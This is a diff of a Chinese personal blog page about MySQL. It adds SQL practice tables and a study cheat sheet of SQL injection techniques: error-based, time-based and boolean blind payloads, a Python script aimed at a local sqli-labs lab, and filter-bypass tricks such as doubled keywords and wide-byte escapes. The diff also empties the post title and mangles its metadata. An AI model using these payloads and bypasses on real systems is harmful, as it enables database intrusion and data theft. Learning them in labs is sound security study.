@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="GEEK," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -79,18 +79,17 @@
 
 
 
-<meta name="description" content="踩坑区mysql root密码忘记解决办法：管理员模式：net stop mysqlcmd窗口执行:mysqld --skip-grant-tables(跳过安全检查)新打开第二个cmd窗口root连接mysql：mysql -u root切换数据库： use mysql;设置新密码：     update mysql.user set authentication_string=password">
-<meta name="keywords" content="GEEK">
+<meta name="description" content="/////                                                                                                                 去  title: mysql踩过的坑 tag: GEEK踩坑区mysql root密码忘记解决办法：管理员模式：">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mysql踩过的坑">
+<meta property="og:title" content="Jason&#39;s sky">
 <meta property="og:url" content="http://yoursite.com/2018/04/25/mysql学习/index.html">
 <meta property="og:site_name" content="Jason&#39;s sky">
-<meta property="og:description" content="踩坑区mysql root密码忘记解决办法：管理员模式：net stop mysqlcmd窗口执行:mysqld --skip-grant-tables(跳过安全检查)新打开第二个cmd窗口root连接mysql：mysql -u root切换数据库： use mysql;设置新密码：     update mysql.user set authentication_string=password">
+<meta property="og:description" content="/////                                                                                                                 去  title: mysql踩过的坑 tag: GEEK踩坑区mysql root密码忘记解决办法：管理员模式：">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-09-19T05:16:15.674Z">
+<meta property="og:updated_time" content="2018-10-30T15:14:16.986Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="mysql踩过的坑">
-<meta name="twitter:description" content="踩坑区mysql root密码忘记解决办法：管理员模式：net stop mysqlcmd窗口执行:mysqld --skip-grant-tables(跳过安全检查)新打开第二个cmd窗口root连接mysql：mysql -u root切换数据库： use mysql;设置新密码：     update mysql.user set authentication_string=password">
+<meta name="twitter:title" content="Jason&#39;s sky">
+<meta name="twitter:description" content="/////                                                                                                                 去  title: mysql踩过的坑 tag: GEEK踩坑区mysql root密码忘记解决办法：管理员模式：">
 
 
 
@@ -126,7 +125,7 @@
 
 
 
-  <title>mysql踩过的坑 | Jason's sky</title>
+  <title> | Jason's sky</title>
   
 
 
@@ -280,7 +279,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">mysql踩过的坑</h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -310,7 +309,7 @@
 
           
           
-             <span id="/2018/04/25/mysql学习/" class="leancloud_visitors" data-flag-title="mysql踩过的坑">
+             <span id="/2018/04/25/mysql学习/" class="leancloud_visitors" data-flag-title="">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -335,7 +334,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  403
+                  1,483
                 </span>
               
 
@@ -351,7 +350,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  7
                 </span>
               
             </div>
@@ -372,7 +371,10 @@
       
 
       
-        <h1 id="踩坑区"><a href="#踩坑区" class="headerlink" title="踩坑区"></a>踩坑区</h1><p>mysql root密码忘记解决办法：<br>管理员模式：<br><code>net stop mysql</code><br>cmd窗口执行:<code>mysqld --skip-grant-tables</code>(跳过安全检查)<br>新打开第二个cmd窗口root连接mysql：<code>mysql -u root</code><br>切换数据库： <code>use mysql;</code><br>设置新密码：    </p>
+        <pre><code>                         /////                                                                                                                 去
+</code></pre><hr>
+<p>title: mysql踩过的坑</p>
+<h2 id="tag-GEEK"><a href="#tag-GEEK" class="headerlink" title="tag: GEEK"></a>tag: GEEK</h2><h1 id="踩坑区"><a href="#踩坑区" class="headerlink" title="踩坑区"></a>踩坑区</h1><p>mysql root密码忘记解决办法：<br>管理员模式：<br><code>net stop mysql</code><br>cmd窗口执行:<code>mysqld --skip-grant-tables</code>(跳过安全检查)<br>新打开第二个cmd窗口root连接mysql：<code>mysql -u root</code><br>切换数据库： <code>use mysql;</code><br>设置新密码：    </p>
 <pre><code>update mysql.user
 set authentication_string=password(&#39;wjx666&#39;)    
   where user=&#39;root&#39; and Host =
@@ -389,6 +391,44 @@ quit;(退出登陆)
 <p><code>mysql -h 主机名 -u 用户名 -p</code></p>
 <p>创建数据库<code>CREATE DATABASE menagerie DEFAULT CHARSET utf8</code></p>
 <p>事物的4个属性:<br>原子性：事务是一个不可分割的工作单位，事务中包括的诸操作要么都做，要么都不做<br>一致性：事务必须使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的<br>隔离性:一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰<br>持久性:持续性也称永久性（permanence），指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响    </p>
+<p>测试数据</p>
+<p>–学生表<br>CREATE TABLE <code>Student</code>(<br>    <code>s_id</code> VARCHAR(20),<br>    <code>s_name</code> VARCHAR(20) NOT NULL DEFAULT ‘’,<br>    <code>s_birth</code> VARCHAR(20) NOT NULL DEFAULT ‘’,<br>    <code>s_sex</code> VARCHAR(10) NOT NULL DEFAULT ‘’,<br>    PRIMARY KEY(<code>s_id</code>)<br>);</p>
+<p>CREATE TABLE <code>Course</code>(<br>    <code>c_id</code>  VARCHAR(20),<br>    <code>c_name</code> VARCHAR(20) NOT NULL DEFAULT ‘’,<br>    <code>t_id</code> VARCHAR(20) NOT NULL,<br>    PRIMARY KEY(<code>c_id</code>)<br>);<br>–教师表<br>CREATE TABLE <code>Teacher</code>(<br>    <code>t_id</code> VARCHAR(20),<br>    <code>t_name</code> VARCHAR(20) NOT NULL DEFAULT ‘’,<br>    PRIMARY KEY(<code>t_id</code>)<br>);<br>–成绩表<br>CREATE TABLE <code>Score</code>(<br>    <code>s_id</code> VARCHAR(20),<br>    <code>c_id</code>  VARCHAR(20),<br>    <code>s_score</code> INT(3),<br>    PRIMARY KEY(<code>s_id</code>,<code>c_id</code>)<br>);<br>–插入学生表测试数据<br>insert into Student values(‘01’ , ‘赵雷’ , ‘1990-01-01’ , ‘男’);<br>insert into Student values(‘02’ , ‘钱电’ , ‘1990-12-21’ , ‘男’);<br>insert into Student values(‘03’ , ‘孙风’ , ‘1990-05-20’ , ‘男’);<br>insert into Student values(‘04’ , ‘李云’ , ‘1990-08-06’ , ‘男’);<br>insert into Student values(‘05’ , ‘周梅’ , ‘1991-12-01’ , ‘女’);<br>insert into Student values(‘06’ , ‘吴兰’ , ‘1992-03-01’ , ‘女’);<br>insert into Student values(‘07’ , ‘郑竹’ , ‘1989-07-01’ , ‘女’);<br>insert into Student values(‘08’ , ‘王菊’ , ‘1990-01-20’ , ‘女’);<br>–课程表测试数据<br>insert into Course values(‘01’ , ‘语文’ , ‘02’);<br>insert into Course values(‘02’ , ‘数学’ , ‘01’);<br>insert into Course values(‘03’ , ‘英语’ , ‘03’);</p>
+<p>–教师表测试数据<br>insert into Teacher values(‘01’ , ‘张三’);<br>insert into Teacher values(‘02’ , ‘李四’);<br>insert into Teacher values(‘03’ , ‘王五’);</p>
+<p>–成绩表测试数据<br>insert into Score values(‘01’ , ‘01’ , 80);<br>insert into Score values(‘01’ , ‘02’ , 90);<br>insert into Score values(‘01’ , ‘03’ , 99);<br>insert into Score values(‘02’ , ‘01’ , 70);<br>insert into Score values(‘02’ , ‘02’ , 60);<br>insert into Score values(‘02’ , ‘03’ , 80);<br>insert into Score values(‘03’ , ‘01’ , 80);<br>insert into Score values(‘03’ , ‘02’ , 80);<br>insert into Score values(‘03’ , ‘03’ , 80);<br>insert into Score values(‘04’ , ‘01’ , 50);<br>insert into Score values(‘04’ , ‘02’ , 30);<br>insert into Score values(‘04’ , ‘03’ , 20);<br>insert into Score values(‘05’ , ‘01’ , 76);<br>insert into Score values(‘05’ , ‘02’ , 87);<br>insert into Score values(‘06’ , ‘01’ , 31);<br>insert into Score values(‘06’ , ‘03’ , 34);<br>insert into Score values(‘07’ , ‘02’ , 89);<br>insert into Score values(‘07’ , ‘03’ , 98);</p>
+<h1 id="报错的SQL盲注"><a href="#报错的SQL盲注" class="headerlink" title="报错的SQL盲注"></a>报错的SQL盲注</h1><p>经典报错<br><code>select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</code><br>简化如下<br><code>select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</code><br>关键表禁用<br><code>select count(*) from (select 1 union select null union 
+select !1) group by concat(version(),floor(rand(0)*2))</code><br>rand被禁用<br><code>select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></p>
+<h1 id="基于时间的SQL盲注"><a href="#基于时间的SQL盲注" class="headerlink" title="基于时间的SQL盲注"></a>基于时间的SQL盲注</h1><p><code>if(condition,true,false)</code><br>测试语句<br><code>select If(ascii(substr(database(),1,1))&gt;115,0,sleep(5));</code></p>
+<h1 id="BOOL盲注"><a href="#BOOL盲注" class="headerlink" title="BOOL盲注"></a>BOOL盲注</h1><p><code>SELECT LEFT(ARG,LENGTH) FROM table_name;</code> Left函数用法<br>参考脚本</p>
+<pre><code>import requests
+url = &#39;http://192.168.2.100/sqli-labs/Less-6/?id=1&quot;&#39;
+print(&quot;获取数据库长度&quot;)
+for i in range(1, 32):
+    payload = &quot;and length(database())=%d--+&quot; % i
+    res = requests.get(url + payload)
+    if &quot;You are in...........&quot; in res.text:
+        print(&quot;[+]数据库长度为:&quot; + str(i) + &quot;位&quot;)
+        break
+</code></pre><h1 id="SQL注入关键词绕过"><a href="#SQL注入关键词绕过" class="headerlink" title="SQL注入关键词绕过"></a>SQL注入关键词绕过</h1><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p><code>/**/ -- #</code><br>查询语句<br><code>select * from Student where s_id= /*11*/1;</code></p>
+<h2 id="内联注释符"><a href="#内联注释符" class="headerlink" title="内联注释符"></a>内联注释符</h2><p>加上可绕过<br><code>select * from Student where s_id=1 union /*!SeLEct*/ * from Student where s_id=2#;</code></p>
+<h2 id="双关键字"><a href="#双关键字" class="headerlink" title="双关键字"></a>双关键字</h2><p>如果waf过滤了关键字可绕过<br><code>?id=1+UNIunionON+SeLselectECT+1,2,3–</code></p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>16进制绕过<br><code>select * from Student where s_id=1 union SeLEct * from Student where s_id=0x1;</code></p>
+<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>可用双空格/制表符/尝试，/**/做空格，括号抱起来，回车代替，<code>反引号</code>select(s_id)from(Student)where(s_id=1);`</p>
+<p><code>select/**/s_id/**/from/**/Student/**/where/**/s_id=1/**/;</code></p>
+<pre><code>select * from`Student`where`s_id`=1;
+</code></pre><h2 id="等于号绕过"><a href="#等于号绕过" class="headerlink" title="等于号绕过"></a>等于号绕过</h2><p><code>select * from Student where s_name like &#39;赵雷&#39;;</code></p>
+<h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><p>在使用盲注的时候，需要使用到substr(),mid(),limit；这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from for的方式来解决，limit则可以用offset；</p>
+<p><code>select * from sql_test where ascii(mid(username from 1 for 1))&gt;1</code></p>
+<p><code>select * from sql_test where ascii(substr(username from 1 for 1))&gt;97;</code></p>
+<p><code>select * from sql_test limit 1 offset 1</code></p>
+<h2 id="大于号小于号拦截绕过"><a href="#大于号小于号拦截绕过" class="headerlink" title="大于号小于号拦截绕过"></a>大于号小于号拦截绕过</h2><p> 在使用盲注的时候，在爆破的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp,in,between来进行绕过了。<br><code>select * from Student where s_id=1 and greatest(ascii(substr(s_birth,1,1)),1)=49;</code></p>
+<p><code>select * from Student where s_id=1 and strcmp(ascii(substr(s_birth,1,1)),1);</code></p>
+<p><code>select * from Student where s_id=1 and strcmp(ascii(substr(s_birth,1,1)),2);</code></p>
+<p><code>select * from Student where s_id=1 and substr(s_birth,1,1) in (&#39;1&#39;);</code></p>
+<h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p><code>%bf%27 %df%27 %aa%27</code></p>
+<p>   %df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
+<p>报错注入<br><code>extractvalue/updatexml</code></p>
+<p><code>\N,E0,.0</code>绕过<br>相当于NULL字符</p>
 
       
     </div>
@@ -432,12 +472,6 @@ quit;(退出登陆)
     
 
     <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/GEEK/" rel="tag"># GEEK</a>
-          
-        </div>
       
 
       
@@ -541,7 +575,7 @@ quit;(退出登陆)
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -615,7 +649,7 @@ quit;(退出登陆)
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#踩坑区"><span class="nav-number">1.</span> <span class="nav-text">踩坑区</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重装系统mysql"><span class="nav-number">2.</span> <span class="nav-text">重装系统mysql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows下mysql命令"><span class="nav-number">3.</span> <span class="nav-text">Windows下mysql命令</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#tag-GEEK"><span class="nav-number">1.</span> <span class="nav-text">tag: GEEK</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#踩坑区"><span class="nav-number"></span> <span class="nav-text">踩坑区</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#重装系统mysql"><span class="nav-number"></span> <span class="nav-text">重装系统mysql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows下mysql命令"><span class="nav-number"></span> <span class="nav-text">Windows下mysql命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#报错的SQL盲注"><span class="nav-number"></span> <span class="nav-text">报错的SQL盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于时间的SQL盲注"><span class="nav-number"></span> <span class="nav-text">基于时间的SQL盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BOOL盲注"><span class="nav-number"></span> <span class="nav-text">BOOL盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入关键词绕过"><span class="nav-number"></span> <span class="nav-text">SQL注入关键词绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注释符"><span class="nav-number">1.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内联注释符"><span class="nav-number">2.</span> <span class="nav-text">内联注释符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#双关键字"><span class="nav-number">3.</span> <span class="nav-text">双关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编码绕过"><span class="nav-number">4.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#空格绕过"><span class="nav-number">5.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#等于号绕过"><span class="nav-number">6.</span> <span class="nav-text">等于号绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#逗号绕过"><span class="nav-number">7.</span> <span class="nav-text">逗号绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#大于号小于号拦截绕过"><span class="nav-number">8.</span> <span class="nav-text">大于号小于号拦截绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节"><span class="nav-number">9.</span> <span class="nav-text">宽字节</span></a></li></ol></div>
             
 
           </div>
